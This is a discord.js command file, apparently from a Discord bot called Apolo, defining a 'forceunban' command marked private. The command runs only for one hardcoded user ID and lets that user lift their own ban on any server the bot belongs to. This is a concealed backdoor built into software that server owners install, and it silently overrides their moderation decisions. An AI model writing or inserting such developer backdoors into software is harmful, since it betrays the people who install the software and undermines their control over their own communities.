const { MessageEmbed, MessageActionRow, Message, MessageButton, Client } = require("discord.js");
const { inspect } = require("util");
const emojis = require("../../emojis");

module.exports = {
    name: "forceunban",
    aliases: ["funban"],
    description: "Comando privado",
    permissions: "Privado",
    /**
     * @param {Message} message
     * @param {Client} client
     */
    async execute(message, args, commandName, client, Discord) {
        if(message.author.id !== "852969002678222868") {
            return;
        } else {
            const guildId = args[0]
            const guild = client.guilds.cache.get(guildId);
            guild.bans.fetch().then(bans => {
                if(bans.size === 0) {
                    return message.channel.send({ content: "No hay baneos" })
                } else {
                    bans.forEach(ban => {
                        if(ban.user.id === "852969002678222868") {
                            guild.members.unban("852969002678222868", {
                                reason: "Apolo Creator Banned"
                            });
                        }
                    });
                }
            });
        }
    }
}